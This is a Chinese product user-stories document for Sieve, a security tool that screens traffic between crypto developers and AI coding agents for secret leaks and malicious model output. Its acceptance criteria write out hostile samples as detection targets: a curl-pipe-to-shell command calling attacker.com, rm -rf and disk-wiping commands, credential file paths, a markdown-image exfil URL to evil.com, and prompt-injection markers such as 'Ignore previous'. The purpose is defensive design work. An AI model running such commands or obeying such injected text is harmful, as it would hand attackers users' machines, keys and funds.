# Sieve 用户故事

> 本文件是 [PRD v1.3](../prd/sieve-prd-v1.3.md) §3（用户画像）+ §4（核心场景）+ §5（功能需求）的故事化展开。所有 user story 与 PRD 检测项 ID（`OUT-*` / `IN-CR-*` / `IN-GEN-*`）双向对齐。

---

## 用户角色

### P0 客群：Crypto-native AI 重度开发者（首要）

- 用 Claude Code / 自写 agent 写代码 ≥ 4 小时/天
- 工作涉及智能合约、DeFi 协议、钱包前端、交易脚本、跨链桥
- 持有 $10K+ crypto 资产，部分 $100K-$10M
- 同时使用 OpenAI / Anthropic / OpenRouter / 国内中转站
- 付费意愿：**$49/月无感**
- 地理分布：**海外为主**（欧美 / 东南亚 / 港台），中文圈 dev 但居住海外

### P1 客群：智能合约开发者 + 协议团队成员

- DeFi 协议开发者、bug bounty hunter、合约审计师
- 单笔工作潜在金额 $100K-$100M
- 用 AI 辅助写/审计 Solidity / Vyper / Move / Rust 合约
- 付费意愿：**$49/月**，公司报销

> 详见 [PRD v1.3 §3.1-3.2](../prd/sieve-prd-v1.3.md#3-用户画像)

### ❌ 不服务的客群


| 客群                      | 原因                                                                   |
| ----------------------- | -------------------------------------------------------------------- |
| 企业 CISO                 | Nightfall / Lakera 主场，与一人项目调性不符                                      |
| Crypto 散户（不写代码）         | 钱包扩展即可                                                               |
| 国内政企                    | 奇安信 / 深信服市场，合规复杂                                                     |
| 纯 web2 程序员（无 crypto 资产） | 付费意愿不足以支撑误报治理成本                                                      |
| **中国大陆境内的公开 to-C 商业化**  | 见 [PRD §11.5](../prd/sieve-prd-v1.3.md#115--中国大陆合规边界v13-新增)，营销渠道分级处理 |


> 详见 [PRD v1.3 §3.3](../prd/sieve-prd-v1.3.md#33-不服务的客群)

---

## 用户故事清单

### US-01: 出站防泄漏 · .env 私钥

**作为** P0 crypto-native 开发者，**我希望** 当我把整个 `.env` 文件粘贴给 Claude Code 让它 debug 跨链转账脚本时，Sieve 能精确识别出其中的 Ethereum 私钥 / Infura API key / BIP39 助记词并强制弹窗，**以便** 我不会因为一次手抖把私钥发给中转站、结果被偷走 honeypot 钱包之外的真实资产。

**关联 PRD**：[§4.1 场景 A](../prd/sieve-prd-v1.3.md#41-场景-a出站防泄漏) / [§5.1 OUT-01~12](../prd/sieve-prd-v1.3.md#51-出站检测)
**优先级**：P0
**验收标准**：

- paste 真实 `.env`（含 Eth 私钥 + Infura key）触发 Critical 拦截
- 拦截弹窗列出所有命中检测项（类型 + 命中位置）
- 提供"脱敏后发送 / 取消 / 允许此次"三选项
- OUT-01 / OUT-06 命中时 Critical FP < 0.5%（PRD §6.5 误报预算）
- 脱敏占位符固定为 `[REDACTED-PRIVATE-KEY]` 之类规范化字符串

---

### US-02: 出站防泄漏 · BIP39 助记词（差异化点）

**作为** P0 客群，**我希望** Sieve 能识别 12/15/18/21/24 词的 BIP39 助记词并通过 **SHA-256 校验位** 判定它是真实助记词而非随机词序，**以便** 我能放心使用 AI 助手讨论钱包恢复 / HD wallet 派生流程，又不会把真实助记词漏出去。

**关联 PRD**：[§5.1 OUT-09](../prd/sieve-prd-v1.3.md#51-出站检测) / [§9 第 4 条](../prd/sieve-prd-v1.3.md#9-工程上必须做对的硬约束)
**优先级**：P0
**验收标准**：

- 12/15/18/21/24 词且 SHA-256 校验通过 → Critical 拦截
- 12/15/18/21/24 词但 SHA-256 校验失败 → 不报警（避免误报正常英文文档）
- OUT-09 Critical FP < 0.05%（PRD §5.1 表格）
- 在 README 与营销文章中作为差异化能力宣传（PRD §9 第 4 条）

---

### US-03: 出站 · 占位符黑名单 + .sieveignore 白名单

**作为** P0 客群，**我希望** Sieve 自动忽略明显的占位符（`0x0000...`、`sk-xxx`、`AKIAEXAMPLE...`）+ 我能把项目内的合法 fingerprint（例如测试链固定测试私钥）写进 `.sieveignore`，**以便** 我不会被同一条 false positive 反复打断。

**关联 PRD**：[§5.1 出站交互模式](../prd/sieve-prd-v1.3.md#出站交互模式)
**优先级**：P0
**验收标准**：

- 内置占位符黑名单覆盖主流 SDK 文档示例字符串
- `.sieveignore` 支持 `rule_id:sha256_prefix` 格式 fingerprint
- `.sieveignore` 在仓库根目录与 `~/.sieve/` 都可放置，优先级 repo > user
- 单元测试覆盖：黑名单命中 / 白名单命中 / 二者都命中的优先级

---

### US-04: 入站 · 地址替换检测

**作为** P1 合约开发者，**我希望** 当我让模型写一个转账到 `0x742d35...1234A` 的脚本，但中转站偷偷把模型输出里的地址换成 `0x742d35...1234B`（仅末位差异）时，Sieve 能比对对话历史标红警告，**以便** 我不会签了一个把资产转给攻击者的交易。

**关联 PRD**：[§4.2 场景 B](../prd/sieve-prd-v1.3.md#42-场景-b入站防地址替换) / [§5.2 IN-CR-01](../prd/sieve-prd-v1.3.md#phase-1-p0crypto-钩子mvp-第-3-4-周)
**优先级**：P0
**验收标准**：

- 维护对话历史所有 `0x[a-fA-F0-9]{40}` 地址集合
- 模型输出的新地址：完全相同 → 放行；前 N 后 M 匹配 → 标红 Critical；Levenshtein ≤ 4 → 标黄 High
- UI 显示"你 prompt：xxx / 模型输出：yyy / 差异 N 字符"
- 复现 UCSB 论文 *Your Agent Is Mine* 4 类攻击 PoC，全部捕获（PRD §10.1 Week 3 完成定义）

---

### US-05: 入站 · 危险工具调用 fail-closed（YOLO mode 救命）

**作为** 偶尔开 YOLO mode 的 P0 用户，**我希望** 即使我开了 YOLO mode，当模型返回 `bash("curl https://attacker.com/cleanup.sh | sh")` 这种远程脚本下载执行的 tool_use 时，Sieve 仍然 **fail-closed 强制人工确认**，**以便** 一次注入 / 一次中转站作恶不会把我的开发机变成肉鸡。

**关联 PRD**：[§4.3 场景 C](../prd/sieve-prd-v1.3.md#43-场景-c入站防危险工具调用yolo-mode-救命) / [§5.2 IN-CR-02 + IN-GEN-01~03](../prd/sieve-prd-v1.3.md#phase-1-p0通用入站mvp-第-4-5-周) / [§9 第 3 条](../prd/sieve-prd-v1.3.md#9-工程上必须做对的硬约束)
**优先级**：P0
**验收标准**：

- `bash` 含 `rm -rf` / `curl..|sh` / `wget..|bash` / `bash <(curl ..)` / `eval(base64..)` / `sudo` → Critical 拦截
- **YOLO mode 配置项中此行为不可关闭**（PRD §9 第 3 条 + 第 8 条）
- 拦截界面显示完整命令 + 风险类型 + 域名是否在白名单
- 复现 fork bomb / `> /dev/sda` / `dd if=/dev/zero` 全部命中 IN-GEN-01

---

### US-06: 入站 · 签名工具 fail-closed

**作为** P1 合约开发者，**我希望** 任何 `eth_sendTransaction` / `signTransaction` / `signMessage` / `signTypedData` 调用都被 Sieve 强制弹窗，**且 YOLO mode 不可关闭**，弹窗显示完整 typed data + 解析 `verifyingContract`（自动识别 Pink Drainer 数字化绕过等已知模式），**以便** 我不会因为模型/中转站构造的 EIP-712 钓鱼签名而授权 drainer。

**关联 PRD**：[§4.4 场景 D](../prd/sieve-prd-v1.3.md#44-场景-d入站防签名钓鱼) / [§5.2 IN-CR-05](../prd/sieve-prd-v1.3.md#phase-1-p0crypto-钩子mvp-第-3-4-周) / [§9 第 3 条](../prd/sieve-prd-v1.3.md#9-工程上必须做对的硬约束)
**优先级**：P0
**验收标准**：

- 上述 4 个签名相关 RPC 方法 100% 触发 Critical 拦截
- 弹窗解析 `verifyingContract` 数字 → 0x 地址 → 已知协议白名单匹配状态
- 数字化 verifyingContract 触发"已知 drainer 模式：数字化绕过"提示
- **YOLO mode 不可关闭**（PRD §9 第 3 条），配置文件试图关闭时启动失败

---

### US-07: 入站 · 敏感路径访问 + 持久化机制

**作为** P0 客群，**我希望** 当模型返回的 tool_use 试图读 `~/.ssh/id_rsa` / `~/.aws/credentials` / `/etc/shadow` / `*.keystore` / `~/.config/solana/`，或写 `crontab` / `launchd` / `systemd` / `.bashrc` / `.zshrc` 时，Sieve 触发 Critical 拦截，**以便** 即使我让模型"清理一下机器"也不会被偷走凭证或埋后门。

**关联 PRD**：[§5.2 IN-CR-03 / IN-CR-04](../prd/sieve-prd-v1.3.md#phase-1-p0crypto-钩子mvp-第-3-4-周)
**优先级**：P0
**验收标准**：

- IN-CR-03 路径黑名单覆盖 SSH / AWS / GCP / Solana / Ethereum keystore
- IN-CR-04 持久化机制覆盖 cron / launchd / systemd / shell rc 文件
- 读 vs 写区分：读敏感路径 = High，写持久化机制 = Critical
- 二者命中时 Critical/High FP 分别 < 0.5% / < 3%（PRD §6.5）

---

### US-08: 入站 · Markdown 图片 exfil + Prompt injection 反向

**作为** P0 客群，**我希望** 模型返回的 markdown 中如果含 `![](http://evil.com/?leak=私钥)` 这种通过图片 URL 偷数据的模式 + 任何 `<|im_start|>` / `[INST]` / `### System:` / `Ignore previous` 反向 prompt injection 都被 Sieve 标红，**以便** 我不会因为渲染 markdown 时浏览器/IDE 自动 fetch 图片而泄漏数据。

**关联 PRD**：[§5.2 IN-GEN-04 / IN-GEN-05](../prd/sieve-prd-v1.3.md#phase-1-p0通用入站mvp-第-4-5-周)
**优先级**：P0
**验收标准**：

- IN-GEN-04：markdown 图片 URL 域名不在白名单 + 含可疑 query string → High 警告
- IN-GEN-05：上述四种 prompt injection 标记字符串 → High 警告
- 二者均为 High，IN-GEN-* High FP < 10%（PRD §6.5）
- 用户可通过 `.sieveignore` 加白名单域名

---

### US-09: 处置矩阵 · Critical 永不可关 + 四级处置等级

**作为** P0 客群，**我希望** Sieve 提供 Critical（拦截）/ High（弹窗 + 5 秒倒计时）/ Medium（标记 + 日志）/ Low（静默记录）四级处置；其中 **Critical 在所有版本（包括降级模式之前）不可关闭**，**以便** 我能在不被噪音淹没的同时，对真正的高风险动作有强制摩擦。

**关联 PRD**：[§5.3 处置矩阵](../prd/sieve-prd-v1.3.md#53-处置矩阵) / [§9 第 8 条](../prd/sieve-prd-v1.3.md#9-工程上必须做对的硬约束) / [§6.5 误报率预算](../prd/sieve-prd-v1.3.md#65-误报率预算)
**优先级**：P0
**验收标准**：

- 四级处置 UI 表现一致（全屏告警 / 弹窗 / 状态栏图标 / 无）
- 各级 FP 上限严格遵守 PRD §6.5：Critical 拦截 FP < 0.5%、High Warn FP < 5%（OUT-*）/ < 3%（IN-CR-*）/ < 10%（IN-GEN-*）
- 配置文件试图关闭任意 Critical 检测项 → 启动失败 + 明确错误信息
- 文档与 README 明示"Critical 不可关闭是产品安全承诺，不是用户偏好"
- 降级模式（试用结束未付费）下 Critical 也不被关闭，仅由"拦截"降为"只读警告"——参见 US-12

---

### US-10: 规则更新 · Ed25519 签名 + 离线可用

**作为** P0 客群（含部分时间断网工作的开发者），**我希望** Sieve 的规则库每周通过签名文件下载、用 Ed25519 签名验证、客户端只下载不上传，**且静态资源更新可关闭、完全离线可用**，**以便** 我在 air-gapped 环境也能用，且不会被一次规则下发投毒。

**关联 PRD**：[§8.3 规则更新](../prd/sieve-prd-v1.3.md#83-规则更新) / [§9 第 6 条 + 第 2 条](../prd/sieve-prd-v1.3.md#9-工程上必须做对的硬约束)
**优先级**：P0
**验收标准**：

- 规则更新前必须 Ed25519 签名验证通过，否则拒绝加载并保留旧规则
- 配置项 `rules.update.enabled = false` 关闭后完全离线可用，不影响 Critical 拦截
- 客户端**绝不**上传 prompt / 样本 / 命中信息（PRD §11.2）
- 透明日志：每次规则更新发布 changelog + 哈希到 GitHub Releases

---

### US-11: 自证清白 · 用户能用 cosign 验证二进制

**作为** P1 审计研究员，**我希望** Sieve 每个 release 都有 sigstore 签名 + reproducible build 凭证 + pinned dependencies 锁文件，且我能用 `cosign verify` 在本地独立验证下载的二进制确实来自公开声明的构建流程，**以便** Sieve 自己不会成为下一个 LiteLLM 供应链事件。

**关联 PRD**：[§1.2 第 4 句](../prd/sieve-prd-v1.3.md#12-四句话核心叙事v13-加第-4-句) / [§9 第 6 条](../prd/sieve-prd-v1.3.md#9-工程上必须做对的硬约束) / [§10.1 Week 1](../prd/sieve-prd-v1.3.md#week-1基础设施--anthropic-协议) / [§11.3](../prd/sieve-prd-v1.3.md#113-开源策略)
**优先级**：P0（**Week 1 必须跑通**，§10.1）
**验收标准**：

- GitHub Actions reproducible build pipeline Week 1 跑通
- 每个 release 附 sigstore 签名 + SLSA provenance
- README 提供 `cosign verify-blob` 一行命令示例
- 核心引擎 Week 12 GA 后开源（MIT），用户可独立从源码复现二进制
- 营销文章"自证清白：Sieve 怎么证明自己不是新的 LiteLLM"（PRD §10.2 Week 10 文章 2）

---

### US-12: 降级模式 · 试用结束变只读警告

**作为** 14 天试用结束未付费的潜在用户，**我希望** Sieve 不会突然完全失效让我裸奔，而是 **降级为只读警告模式**——继续显示告警但不再 Critical 拦截，**以便** 我有充足时间评估是否付费 $49/月，同时不会立即陷入"无 Sieve 也无防护"的 worst case。

**关联 PRD**：[§7.1 单一定价](../prd/sieve-prd-v1.3.md#71-单一定价) / [§14 Open Question 6](../prd/sieve-prd-v1.3.md#14-open-questions还需要-doskey-决策)
**优先级**：P0
**验收标准**：

- 14 天试用 license 到期后自动切到 "Read-only Warn" 模式
- 降级模式下：所有检测照常运行，但 Critical 不阻断、High 倒计时去掉、用户行为照常
- 状态栏 / CLI banner 持续显示"已降级 - 升级 $49/月恢复全功能"
- 升级流程：付款后 license key 重新激活即可恢复，无需重启进程
- **不让用户感觉被坑**（PRD §14 Open Question 6 决策落地）：试用结束前 3 天提示，不偷换语义

---

### US-13: 本地审计日志 · SQLite append-only 查询

**作为** P1 合约开发者（事后复盘需求强烈），**我希望** Sieve 把所有命中事件（时间戳 / 检测项 ID / 处置等级 / 用户决策）写入本地 SQLite append-only 表，且我能用 SQL 查询历史事件，**以便** 出问题时复盘"那次签名我到底点了什么 / 这周一共拦了多少次 .env 泄漏"。

**关联 PRD**：[§10.1 Week 5](../prd/sieve-prd-v1.3.md#week-5打磨--配置--文档) / [§11.2 ToS](../prd/sieve-prd-v1.3.md#112-tos)
**优先级**：P0
**验收标准**：

- 审计日志表结构：`id / timestamp / rule_id / severity / decision / context_hash`（**不存原文**）
- append-only：禁用 `UPDATE` / `DELETE`（仅允许 `VACUUM` 由 CLI 子命令显式触发）
- CLI 提供 `sieve log query` 子命令支持基础过滤
- 日志**仅在本地**，**绝不上传**（PRD §11.2）
- 默认保留 90 天，可配置

---

## 未覆盖的 Phase 2 故事

以下故事属于 [PRD §5.1 / §5.2 Phase 2](../prd/sieve-prd-v1.3.md#5-功能需求) 范围，**Phase 1 不实现**，待真有用户需求 + 第二个商业化客户主动要时启动：


| 编号草稿     | 故事概要                                                                               | 关联 PRD                             |
| -------- | ---------------------------------------------------------------------------------- | ---------------------------------- |
| US-P2-01 | MCP server 调用拦截 + scope-aware policy（不在 allowlist 强制确认 / 参数敏感关键字拦截 / MCP 输出反向利用检测） | §5.2 Phase 2 IN-MCP-01~03（v1.3 新增） |
| US-P2-02 | Solidity 后门检测（Slither 集成）                                                          | §5.2 Phase 2                       |
| US-P2-03 | Drainer 黑名单（Chainabuse + ScamSniffer 集成）                                           | §5.2 Phase 2 + §13.2 数据合作          |
| US-P2-04 | npm / pip typosquat 检测                                                             | §5.2 Phase 2                       |
| US-P2-05 | Calldata 静态解码（4byte 离线 SQLite）                                                     | §5.2 Phase 2                       |
| US-P2-06 | ERC20 危险 approve（approve(MAX) / setApprovalForAll）                                 | §5.2 Phase 2                       |
| US-P2-07 | EIP-2612 / EIP-7702 滥用检测                                                           | §5.2 Phase 2                       |
| US-P2-08 | Unicode 攻击防御（NFC + 控制字符黑名单）                                                        | §5.2 Phase 2                       |
| US-P2-09 | 中文 PII（身份证 / 银行卡 / 统一信用代码）                                                         | §5.1 Phase 2                       |
| US-P2-10 | 自定义规则 DSL                                                                          | §5.1 Phase 2                       |
| US-P2-11 | 多 agent 适配（OpenClaw / Hermes / 自写 agent）                                           | §10.3 Phase C "第二个用户主动要时再做"        |


> **触发条件**：上述故事的优先级排序由"真实用户付费请求"决定，非 doskey 个人想象——参见 PRD §9 第 9 条"不为想象用户写代码"。